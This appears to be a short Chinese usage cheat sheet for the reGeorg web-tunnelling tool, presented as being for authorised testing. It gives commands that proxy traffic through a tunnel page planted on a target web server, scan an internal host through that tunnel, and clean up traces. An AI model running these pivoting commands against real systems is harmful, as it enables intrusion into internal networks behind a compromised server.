# reGeorg 使用

reGeorg 用于 Web tunnel 场景实验，适合授权环境里验证 Web 出口通道风险。

## 常用命令

```bash
python3 reGeorgSocksProxy.py -u http://target/tunnel.jsp -p 1080
```

```bash
curl --socks5 127.0.0.1:1080 http://internal.local
```

```bash
proxychains nmap -sT -Pn -p 80 10.0.0.10
```

```bash
python3 reGeorgSocksProxy.py -u http://target/tunnel.aspx -p 1080
```

```bash
lsof -i :1080
```

测试页和代理进程要及时清理，Web 日志里会有明显请求痕迹。
